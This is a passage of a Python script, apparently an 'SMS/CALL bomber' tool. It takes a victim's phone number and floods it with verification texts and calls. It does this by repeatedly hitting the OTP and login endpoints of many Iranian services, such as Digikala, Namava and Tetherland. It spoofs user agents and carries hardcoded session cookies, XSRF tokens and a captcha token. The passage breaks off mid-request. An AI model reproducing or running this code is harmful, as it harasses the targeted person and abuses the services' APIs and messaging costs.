import requests
import random
import os
import USERS

def clear_terminal():
    if os.name == 'nt': 
        os.system('cls')
    else:
        os.system('clear')

# Regular Colors
BL = "\033[0;100m" # Black
R = "\033[0;101m" # Red
G = "\033[0;102m" # Green
Y = "\033[0;103m" # Yellow
B = "\033[0;104m" # Blue
P = "\033[0;105m" # Purple
C = "\033[0;106m" # Cyan
W = "\033[0;107m" # White
# Bold
bl = "\033[1;30m" # Black
r = "\033[1;31m" # Red
g = "\033[1;32m" # Green
y = "\033[1;33m" # Yellow
b = "\033[1;34m" # Blue
p = "\033[1;35m" # Purple
c = "\033[1;36m" # Cyan
w = "\033[1;37m" # White


clear_terminal()
print(f"""{W}
  {R}<!-- ╔╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╗ -->{W}  
  {B}<!-- ╠╬╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╬╣ -->{W}  
  {R}<!-- ╠╣ .d8888. .88b  d88. ╠╣ -->{W}  
  {B}<!-- ╠╣ 88'  YP 88'YbdP`88 ╠╣ -->{W}  
  {R}<!-- ╠╣ `8bo.   88  88  88 ╠╣ -->{W}  
  {B}<!-- ╠╣   `Y8b. 88  88  88 ╠╣ -->{W}  
  {R}<!-- ╠╣ db   8D 88  88  88 ╠╣ -->{W}  
  {B}<!-- ╠╣ `8888Y' YP  YP  YP ╠╣ -->{W}  
  {R}<!-- ╠╣                    ╠╣ -->{W}  
  {B}<!-- ╠╣                    ╠╣ -->{W}  
  {R}<!-- ╠╣ .d8888.            ╠╣ -->{W}  
  {B}<!-- ╠╣ 88'  YP            ╠╣ -->{W}  
  {R}<!-- ╠╣ `8bo.              ╠╣ -->{W}  
  {B}<!-- ╠╣   `Y8b.            ╠╣ -->{W}  
  {R}<!-- ╠╣ db   8D            ╠╣ -->{W}  
  {B}<!-- ╠╣ `8888Y'            ╠╣ -->{W}  
  {Y}<!-- ╠╣                    ╠╣ -->{W}  
  {Y}<!-- ╠╣                    ╠╣ -->{W}  
  {Y}<!-- ╠╣ github => Raoof007 ╠╣ -->{W}  
  {Y}<!-- ╠╣                    ╠╣ -->{W}  
  {Y}<!-- ╠╣                    ╠╣ -->{W}  
  {R}<!-- ╠╣ d8888b.  .d88b.    ╠╣ -->{W}  
  {B}<!-- ╠╣ 88  `8D .8P  Y8.   ╠╣ -->{W}  
  {R}<!-- ╠╣ 88oooY' 88    88   ╠╣ -->{W}  
  {B}<!-- ╠╣ 88~~~b. 88    88   ╠╣ -->{W}  
  {R}<!-- ╠╣ 88   8D `8b  d8'   ╠╣ -->{W}  
  {B}<!-- ╠╣ Y8888P'  `Y88P'    ╠╣ -->{W}  
  {R}<!-- ╠╣                    ╠╣ -->{W}  
  {B}<!-- ╠╣                    ╠╣ -->{W}  
  {R}<!-- ╠╣ .88b  d88. d8888b. ╠╣ -->{W}  
  {B}<!-- ╠╣ 88'YbdP`88 88  `8D ╠╣ -->{W}  
  {R}<!-- ╠╣ 88  88  88 88oooY' ╠╣ -->{W}  
  {B}<!-- ╠╣ 88  88  88 88~~~b. ╠╣ -->{W}  
  {R}<!-- ╠╣ 88  88  88 88   8D ╠╣ -->{W}  
  {B}<!-- ╠╣ YP  YP  YP Y8888P' ╠╣ -->{W}  
  {R}<!-- ╠╣                    ╠╣ -->{W}  
  {B}<!-- ╠╣                    ╠╣ -->{W}  
  {R}<!-- ╠╣ d88888b d8888b.    ╠╣ -->{W}  
  {B}<!-- ╠╣ 88'     88  `8D    ╠╣ -->{W}  
  {R}<!-- ╠╣ 88ooooo 88oobY'    ╠╣ -->{W}  
  {B}<!-- ╠╣ 88~~~~~ 88`8b      ╠╣ -->{W}  
  {R}<!-- ╠╣ 88.     88 `88.    ╠╣ -->{W}  
  {B}<!-- ╠╣ Y88888P 88   YD    ╠╣ -->{W}  
  {R}<!-- ╠╬╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╦╬╣ -->{W}  
  {B}<!-- ╚╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╝ -->{W}  
\n{w}{P}
""")


def CALL_BOMBER():
    Phone_NOMBER = input(F"{g}Enter Nomber For CALL BOMBER : \n  For example : 09123456789 \n  $-")
    CALL = input(F"\n\nEnter Nomber Send CALL : ")
    print("\n!!For Stop enter ctrl+C !!\n")
    for i in range(int(int(CALL))):
        ############################### tetherland ###############################
        headers = {
            'User-Agent': USERS.r_ua(),
            'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5','Content-Type': 'application/json',
            'Referer': 'https://app.tetherland.com/','Origin': 'https://app.tetherland.com','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive','Priority': 'u=0',
        }
        json_data = {'mobile': Phone_NOMBER,
            'device_info': {'brand': '','model': '','browserVersion': '432.0','app_version': '','by': 'web','osName': 'kali',
            'osVersion': 'XP','browserName': 'TOR','platform': 'web','name': 'TEMOX','device': 'web',
            },'otp_type': 'call',
            'device': 'web',
        }
        response = requests.post('https://service.tetherland.com/api/v5/login-register', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")
        ############################### pitzakhooneh ###############################
        cookies = {
        'v_referrer': 'www.google.com','v_url': '%2F','BasketID': '100074786',
        'checkTextTrnslateLan': 'fa','_ga_SC3D0MQHEV': 'GS1.1.1716378187.2.0.1716378187.0.0.0','_ga': 'GA1.1.1097643944.1715860612',
        'wm1400': 'CfDJ8CzQN8tpNoNCvvgACeR3CydyRo-rcxe3JP4C_5zjjctzpMHJoscZXrVUlPMao3-PWVGX2cEiaP_avR70KhCnmeSruCgKobV8E2JfwHpJFtXsiMqp7W_KJglDH7v02cJzqlXjfV3xZ8THTQ3qXUkgjV1os1MKAh_9ixQmFgYofFLO',
        'timeZone': '','2B05B3EB661CC9C49775D608B6AE9B7B8BF53585': 'C754A3E95750A5A7FA5AFC0D4E1614815B036C43',
        '.AspNetCore.Antiforgery.LcR2uivWBag': 'CfDJ8CzQN8tpNoNCvvgACeR3CyeygoAnzctK0jrtIyAM3N9YJFVot9CNqlqX6SVhYPMr8utjatI04SYaxdIUCgPXqByqUZbce890QzGklcVcB7xkmj4leuAdzN9zG9uPYNENMx2STJqqvRKyc6NzUB-UJ5Y',
        '.AspNetCore.Session': 'CfDJ8CzQN8tpNoNCvvgACeR3Cyf33g1WgfEM7LUc92nq6lh5U5Pu%2BKz7ZA6LgRoeNmLdhddvMxe7H8Wu1HlMZFLctnvr47%2B%2FL8BmMJLWD8iX5cDYvBT3jd5RRaNt71c4x3jiJboLCUoTjF4azGTlu8vITh8OkEpqfcTZVVsb6NUukM6v',
        'F365A98FEE31CB95CC9974DF1E9853C762754323': 'B8925A382B7A4F5C2620B2E31781A0227EFA1994','dishSeparateKind': '1',
        }
        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5','Content-Type': 
            'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest','Origin': 'https://pitzakhooneh.ir',
            'Connection': 'keep-alive','Referer': 'https://pitzakhooneh.ir/','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',}
        params = {'lazyLoad': 'true','btnID': 'undefined',}
        data = {'PhoneNumber': Phone_NOMBER,'call': 'true',
            'data1': '38881cf8-35f0-4743-ab33-c9975a6e56c9','data2': '638519875736753156','ForgetPass': 'false',}
        response = requests.post(
            'https://pitzakhooneh.ir/Account/FoodPhoneNumberVerification/',params=params,cookies=cookies,headers=headers,data=data,)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")
        ############################### digikala ###############################
        cookies = {'_sp_ses.13cb': '*',
            '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
            'tracker_glob_new': 'ciewu5l','tracker_session': '67dWL5g',
            'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
            'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
            'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
            '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0','_ga': 'GA1.1.1878235439.1716379968',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://www.digikala.com/','X-Web-Optimize-Response': '1',
            'X-Web-Client': 'kali','Origin': 'https://www.digikala.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
        json_data = {'backUrl': '/','username': Phone_NOMBER,'otp_call': True,}
        response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")
        ############################### vitrin ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','V-Session-ID': 'f06009c5-70d9-448e-b413-035e61a952fe','V-Fingerprint-ID':
            'f0e133830f31be0bffd26154f5ac7f0d','X-XSRF-TOKEN': 
            'eyJpdiI6ImVvVVF1bzlWd2tyR3lyNlpEMUU1M3c9PSIsInZhbHVlIjoiUHBMWTN4clQ4Nk9OV1F1b1VuOU4xdHo3cEdzVVJkN2RoQUpvQS9Zc3JZK3hFZm90azBpWEhDYlA1ekFVL21jbldWRWREWUtPc3lubXZ5cUZRQjFPajR0NjBnVmZNRE5NVkFHaE44WjRoNy9BSEpncXRqRW9Eem92WXVqMGFmU0IiLCJtYWMiOiI2MjNjMWM2M2FmYjIwNWJkYmY2MWU0MzdhNDZjZmI2NjY0Y2RkMDg5OGZhOWE2MDFjZGE3ODgzMWY4OGEwODVmIiwidGFnIjoiIn0=',
            'Origin': 'https://www.vitrin.shop','Alt-Used': 'www.vitrin.shop','Connection': 'keep-alive','Referer':
            'https://www.vitrin.shop/login','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Priority': 'u=0',}
        json_data = {
            'phone_number': USERS.r_ua(),
            'forgot_password': False,}
        response = requests.post('https://www.vitrin.shop/api/v1/user/request_code', headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND CALL :)")
        else : print(f"{R}{w}NOT SEND CALL :(")

def SMS_BOMBER():
    Phone_NOMBER = input(F"{g}Enter Nomber For SMS BOMBER : \n  For example : 09123456789 \n  $-")
    SMS = input(F"\n\nEnter Nomber Send SMS : ")
    print("\n!!For Stop enter ctrl+C !!\n")
    for i in range(int(int(SMS))):
        ############################### shabdiz ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.shabdizgroup.com/','Origin': 'https://www.shabdizgroup.com',
            'Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
        params = {'phoneNumber': Phone_NOMBER,}
        response = requests.get('https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode', params=params, headers=headers)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### pitzakhooneh ###############################
        cookies = {
        'v_referrer': 'www.google.com','v_url': '%2F','BasketID': '100074786',
        'checkTextTrnslateLan': 'fa','_ga_SC3D0MQHEV': 'GS1.1.1716378187.2.0.1716378187.0.0.0','_ga': 'GA1.1.1097643944.1715860612',
        'wm1400': 'CfDJ8CzQN8tpNoNCvvgACeR3CydyRo-rcxe3JP4C_5zjjctzpMHJoscZXrVUlPMao3-PWVGX2cEiaP_avR70KhCnmeSruCgKobV8E2JfwHpJFtXsiMqp7W_KJglDH7v02cJzqlXjfV3xZ8THTQ3qXUkgjV1os1MKAh_9ixQmFgYofFLO',
        'timeZone': '','2B05B3EB661CC9C49775D608B6AE9B7B8BF53585': 'C754A3E95750A5A7FA5AFC0D4E1614815B036C43',
        '.AspNetCore.Antiforgery.LcR2uivWBag': 'CfDJ8CzQN8tpNoNCvvgACeR3CyeygoAnzctK0jrtIyAM3N9YJFVot9CNqlqX6SVhYPMr8utjatI04SYaxdIUCgPXqByqUZbce890QzGklcVcB7xkmj4leuAdzN9zG9uPYNENMx2STJqqvRKyc6NzUB-UJ5Y',
        '.AspNetCore.Session': 'CfDJ8CzQN8tpNoNCvvgACeR3Cyf33g1WgfEM7LUc92nq6lh5U5Pu%2BKz7ZA6LgRoeNmLdhddvMxe7H8Wu1HlMZFLctnvr47%2B%2FL8BmMJLWD8iX5cDYvBT3jd5RRaNt71c4x3jiJboLCUoTjF4azGTlu8vITh8OkEpqfcTZVVsb6NUukM6v',
        'F365A98FEE31CB95CC9974DF1E9853C762754323': 'B8925A382B7A4F5C2620B2E31781A0227EFA1994','dishSeparateKind': '1',
        }
        headers = {
            'User-Agent': USERS.r_ua(),'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5','Content-Type': 
            'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest','Origin': 'https://pitzakhooneh.ir',
            'Connection': 'keep-alive','Referer': 'https://pitzakhooneh.ir/','Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',}
        params = {'lazyLoad': 'true','btnID': 'undefined',}
        data = {'PhoneNumber': Phone_NOMBER,'call': 'false',
            'data1': '38881cf8-35f0-4743-ab33-c9975a6e56c9','data2': '638519875736753156','ForgetPass': 'false',}
        response = requests.post(
            'https://pitzakhooneh.ir/Account/FoodPhoneNumberVerification/',params=params,cookies=cookies,headers=headers,data=data,)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### digikala ###############################
        cookies = {'_sp_ses.13cb': '*',
            '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
            'tracker_glob_new': 'ciewu5l','tracker_session': '67dWL5g',
            'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
            'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
            'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
            '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0','_ga': 'GA1.1.1878235439.1716379968',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json','Referer': 'https://www.digikala.com/','X-Web-Optimize-Response': '1',
            'X-Web-Client': 'kali','Origin': 'https://www.digikala.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',}
        json_data = {'backUrl': '/','username': Phone_NOMBER,'otp_call': False,}
        response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### faradars ###############################
        cookies = {
            '_ga_MCXYH70MBX': 'GS1.1.1716381662.1.1.1716381703.0.0.0',
            '_ga': 'GA1.2.8330733.1716381663',
            '_ga_1SSNSBRK00': 'GS1.1.1716381663.1.1.1716381703.0.0.0',
            '_clck': '1uxxq72%7C2%7Cflz%7C0%7C1603',
            '_clsk': 'qhq9gz%7C1716381703881%7C3%7C1%7Cz.clarity.ms%2Fcollect',
            'laravel_session': 'eyJpdiI6InRpZUVuTmFib0VoOEZNL1VhV2l4cFE9PSIsInZhbHVlIjoiMzV3UjdrNzhFTW1WVmVobUZWMXgvd2ljdHI2eXZBdzlEd09BYlVXM1AydTd0QzdpSk9HMW0zcy9nZFRWZnV6clAxM3dmbWNEWVIwWCtIUSs4dENwWkJSTEZsOUVZUUllTVF3Vmk1emdXS3pIOGp0V3M1RjhDdkk4cTNBOUVTZ3YiLCJtYWMiOiI2NGE1YzRmNjVjZWQyOTI1M2NjNTkyNjkzNTA1NGMyMmVlYjJmNDdhNmVmNzYzODU3MzQ1NzdlMDU4M2ZmMzYzIiwidGFnIjoiIn0%3D',
            'fara_dars_guest_shopping_cart_04a036a898e2a750d91742f88b2d8599': 'Yk5XNTgwL21sVHlYSFpOY3pSOVhBazdqbkY0S3Ntc3M2cGJrZnRmRm1CU2dIbTBCVkM4a3A5OFZNQUhBc1FHWQ%3D%3D',
            '_gid': 'GA1.2.789109954.1716381702',
            '_gat_gtag_UA_50789780_1': '1',
            '_hjSessionUser_3638482': 'eyJpZCI6ImUzNTQzZTQzLTZjYzQtNWY2Ny04ZTBmLTA3NWZjZTY5MjA0NiIsImNyZWF0ZWQiOjE3MTYzODE3MDQ2MzAsImV4aXN0aW5nIjpmYWxzZX0=',
            '_hjSession_3638482': 'eyJpZCI6IjU4NGUwNzRjLWM4YTktNDhjZS1iZmQ5LTNiYWI5Y2Y4NDc1YiIsImMiOjE3MTYzODE3MDQ2MzEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',}
        headers = {
            'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'EN','Content-Type': 'application/json',
            'Nextjs': 'true','Current-Url': 'https://faradars.org/register','Origin': 'https://faradars.org','Connection': 'keep-alive',
            'Referer': 'https://faradars.org/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
        json_data = {'mobile': Phone_NOMBER,
            'g-recaptcha-response-v3': '03AFcWeA7KhJEAQjyWzwyTbSyYR52rJMJgXekgy2U-8-cUVZIYt2mDcOALct9r5D7iTb7vqbtw1RKSZstIkf8FEAOMj9hVTp18oEnnRA87sa1_ky3BLwnA8MPLOmNLjlFdy2Hjqj53LMnP5zWIdIq1WphjibicA5krlxGAyb2pTkZ_qNfT-lF4UiZU38N0Vsd8Vqdg1kJUaDGVkXSj_6BvJTB-IgQmFTxk3YaRrKfQTtrvKjkKPuOn5daqOSvHv3_UE5CPOcUV4_0gjAiRrlsF-l9hKkdSFH_BmbL166WFRaTXHKASE0Qnd5rBdzJZHs_CDK7-xa6_Ym-jN2dlA5NqDUyjowtNOEY6zSEFDIMlx8LkR_ObH8AEbpXo_JsUUjVS16hqgqgJl4Cdzn4iXQfM_Ha5PUQqO_WljYfbdsbD9vb9yEuH7CE1XybP7VNTUF0yIB_lcaSlI0CJxPF5rFuNQUNgUvGvYQFsN-p-LGJBD_rnT8zXxwvakkoh_cxmB3K6fWOaNTQ05yKSGSc2n07nKVDF8pzIhvTfFAFU3QMqjy0Oh-1werTscoeJPDa3POh1BuT4-uzXj-JVtdR7ZIXZTYkWyhi7ontIa6jVXbAbZ3PbnqB-BJhvMDbHRHD3sfPM0zRjQRuHKZFsUOLMIEAxB33jzf5Z9QQo8Q',
            'digits': 5,'platforms': 'web','source': 'faradars',}
        response = requests.post('https://api.faradars.org/api/client/v1/auth/otp', cookies=cookies, headers=headers, json=json_data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### namava ###############################
        cookies = {'use_legacy_player': 'false','dv-v3': '{"g":"desktop","platform":null}',
            'guest_token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
            'anonymous_login': 'true','_clck': '3i1wnq%7C2%7Cflz%7C0%7C1603','_ga': 'GA1.2.15020820.1716382006',
            '_gid': 'GA1.2.343377359.1716382006','analytics_session_token': '7a7972f5-83c4-9df7-8d34-803934ea2b69',
            'analytics_token': 'e24f424b-f88f-957b-c1d4-b76a251e506c','yektanet_session_last_activity': '5/22/2024','_yngt_iframe': '1',
            '_ga_9XXJ5QGRKG': 'GS1.2.1716382007.1.1.1716382312.31.0.0','_yngt': 'a7f00977-71cf2-24d3f-f1766-6f8787595a1aa',
            '_ga_X8RD5LS5K2': 'GS1.1.1716382009.1.1.1716382303.0.0.0','_clsk': '15384v8%7C1716382303413%7C4%7C1%7Cwww.clarity.ms%2Feus2-c%2Fcollect',
            'auth_nounce': 'YWENFvF1pH5DZkt3lvJ_c1ezUjGfyF1zaLUNvAh2t-rXDDDBi26VKUbji7yLTLLP2btkbVMigz55ACbxIpWMAA2',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json;charset=utf-8','X-Application-Type': 'WebClient','X-Client-Version': '2.64.0',
            'X-Auth-Token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
            'Origin': 'https://www.namava.ir','Connection': 'keep-alive','Referer': 'https://www.namava.ir/auth/register-phone',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',}
        json_data = {'UserName': "+98"+Phone_NOMBER[1:],}
        response = requests.post('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
            cookies=cookies,headers=headers,json=json_data,)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### gap ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'EN',
            'Content-Type': 'application/octet-stream','project': 'gap','APPVERSION': 'web','X-VERSION': '5.0.0-beta.5',
            'Origin': 'https://web.gap.im','Connection': 'keep-alive','Referer': 'https://web.gap.im/','Sec-Fetch-Dest':
            'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',}
        data = 'Þ\x00\x01¦mobile\xad+98'+Phone_NOMBER[1:].encode()
        response = requests.post('https://core.gap.im/v1/user/sendOTP.gap', headers=headers, data=data)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### shab ###############################
        cookies = {'XSRF-TOKEN': 'eyJpdiI6IkFGVWpMY1VxQndCdmZKZVhYeWU0N3c9PSIsInZhbHVlIjoiMVRIZWdXN1hxUHVQdmRzL1hJclZaWjlmQmRQVUIyT01lNFJFWm56MDZLQnpKbmRLdy9QNDhrV1RtUkJndVdUTXRTK3JEVElReE5WbElvdk54UTBKcGZvMnZ5WVppNUxzNFVWdGc1VEZQSGJBUHhidmFnYnc3NFkvZ081SDFJTy8iLCJtYWMiOiI5YTQyNjcyY2Q4YWQyNTQxZTJiM2IxODBmMTI2OWRjYjY1YTQ5NjI2N2I5NmUwYzAyODk5ZTZkMDVkNjAwNjI4IiwidGFnIjoiIn0%3D',
            'shab_ir_session': 'eyJpdiI6Ijd4MlNrVURPRE5IbmlSenRwNUMzcFE9PSIsInZhbHVlIjoiTmlmc3BpakY4Uk5oQndxejF1cTZPN2xKSmhoc2pwMW9rSG9IWWYyYjAwdkR5Nm90akU2WDc2SFRUZWdFQ0I4aTQwRzl0ODN5Qmx3bEQ0dTFsYVd5RnYrNGFxdU9CK3ZVQmdES3k3Uml2ZGt3R3owRFJacjhOQ2hHVXpWQ3JIeUEiLCJtYWMiOiI1ZjQxZDAwNzA5MjAzOTVhOThjMmYxZDhkYjEyZDRmMmE3NDkyYjc2NGY4ZTVkNGM2YjYyNTJkY2M1MzE4OTc3IiwidGFnIjoiIn0%3D',
            'analytics_campaign': '{%22source%22:%22bing%22%2C%22medium%22:%22organic%22}','ab-uid': 'undefined',
            '_ga': 'GA1.1.990556360.1738665501','_gid': 'GA1.2.1179886155.1738665501','_gcl_au': '1.1.1604301295.1738665501',
            '_ga_Q59TN2C13Y': 'GS1.1.1738665501.1.0.1738665501.0.0.0',
            '_hp2_ses_props.1939678616': '%7B%22r%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22ts%22%3A1738665503385%2C%22d%22%3A%22www.shab.ir%22%2C%22h%22%3A%22%2F%22%7D',
            '_hp2_id.1939678616': '%7B%22userId%22%3A%228797042122447787%22%2C%22pageviewId%22%3A%224748544181998709%22%2C%22sessionId%22%3A%221441656766297762%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
            '_clck': 'nzjnay%7C2%7Cft5%7C0%7C1861','_clsk': 'hpxkpe%7C1738665505411%7C1%7C1%7Cx.clarity.ms%2Fcollect',}
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json;charset=UTF-8','Referer': 'https://www.shab.ir/','Platform': 'web','Shab-App': 'web',
            'ab-uid': 'undefined','X-XSRF-TOKEN': 'eyJpdiI6IkFGVWpMY1VxQndCdmZKZVhYeWU0N3c9PSIsInZhbHVlIjoiMVRIZWdXN1hxUHVQdmRzL1hJclZaWjlmQmRQVUIyT01lNFJFWm56MDZLQnpKbmRLdy9QNDhrV1RtUkJndVdUTXRTK3JEVElReE5WbElvdk54UTBKcGZvMnZ5WVppNUxzNFVWdGc1VEZQSGJBUHhidmFnYnc3NFkvZ081SDFJTy8iLCJtYWMiOiI5YTQyNjcyY2Q4YWQyNTQxZTJiM2IxODBmMTI2OWRjYjY1YTQ5NjI2N2I5NmUwYzAyODk5ZTZkMDVkNjAwNjI4IiwidGFnIjoiIn0=',
            'Origin': 'https://www.shab.ir','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',
            'Connection': 'keep-alive','Priority': 'u=0',}
        json_data = {'mobile': Phone_NOMBER,'country_code': '+98',}
        response = requests.post('https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp',cookies=cookies,headers=headers,json=json_data,)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### okala ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json, text/plain, */*','Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.okala.com/','Content-Type': 'application/x-www-form-urlencoded','X-Correlation-Id': 
            '240e1f4e-26d5-4504-a876-83ce59c1a346','session-id': '7a74ced7-2689-4f5b-9967-0fc4c3851a5f','idfa': 'null',
            'metrix_user_id': 'null','ui-version': '2.0','source': 'okala','Origin': 'https://www.okala.com',
            'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Connection': 'keep-alive',
            'Priority': 'u=0',}
        params = {'mobile': Phone_NOMBER,}
        response = requests.post('https://apigateway.okala.com/api/voyager/C/CustomerAccount/CheckHasPassword',params=params, headers=headers)
        if response.status_code == 200 : print(f"{G}{r}SEND SMS :)")
        else : print(f"{R}{w}NOT SEND SMS :(")
        ############################### tetherland ###############################
        headers = {'User-Agent': USERS.r_ua(),'Accept': 'application/json','Accept-Language': 'en-US,en;q=0.5',
